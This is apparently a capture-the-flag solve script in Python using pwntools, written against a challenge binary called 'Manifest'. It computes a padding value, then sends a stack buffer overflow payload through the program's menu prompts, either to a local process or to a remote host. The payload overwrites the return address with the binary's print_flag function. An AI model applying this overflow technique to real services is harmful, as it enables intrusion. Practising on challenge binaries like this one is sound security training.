from pwn import *
import argparse

MASK32 = 0xffffffff


def u32(x):
    return x & MASK32


def rotl32(x, r):
    r &= 31
    return u32(((x << r) | (x >> (32 - r))))


def mix32(s: bytes):
    h = 0x811C9DC5
    for b in s:
        h = u32(h ^ b)
        h = u32(h * 0x1000193)
    h ^= (h >> 13)
    h = u32(h * 0x5BD1E995)
    h ^= (h >> 15)
    return u32(h)


def fold32(x):
    x ^= (x >> 16)
    x = u32(x * 0x7FEB352D)
    x ^= (x >> 15)
    x = u32(x * 0x846CA68B)
    x ^= (x >> 16)
    return u32(x)


def compute_pad(profile: bytes, status: bytes, sigil: int):
    m1 = mix32(profile)
    m2 = mix32(status)
    v = u32(rotl32(m2, 3) ^ m1)
    v ^= u32(sigil)
    v ^= 0x0A53A9C7
    v = fold32(v)
    return v & 0x3F


def get_io(binary, host, port, use_remote):
    if use_remote:
        return remote(host, port)
    return process(binary)


def main():
    parser = argparse.ArgumentParser(description="Manifest BOF solve")
    parser.add_argument("--remote", action="store_true", help="use remote host/port")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=1337)
    parser.add_argument("--binary", default="manifest/chall/awd")
    args = parser.parse_args()

    elf = ELF(args.binary)
    context.binary = elf
    context.arch = "amd64"

    status = b"A"
    pad = compute_pad(b"guest", status, 0)
    total_len = 0x98
    size = total_len - pad
    if not (1 <= size <= 0x60):
        raise SystemExit(f"bad size {size}, pad {pad}")

    payload = b"A" * 0x88 + p64(elf.symbols["print_flag"]) + p64(elf.symbols["main"])
    if len(payload) != size + pad:
        raise SystemExit("payload length mismatch")

    io = get_io(args.binary, args.host, args.port, args.remote)
    io.sendlineafter(b"choice>", b"5")
    io.sendlineafter(b"manifest>", status)
    io.sendlineafter(b"choice>", b"6")
    io.sendlineafter(b"crate size>", str(size).encode())
    io.sendafter(b"payload>", payload)
    io.interactive()


if __name__ == "__main__":
    main()
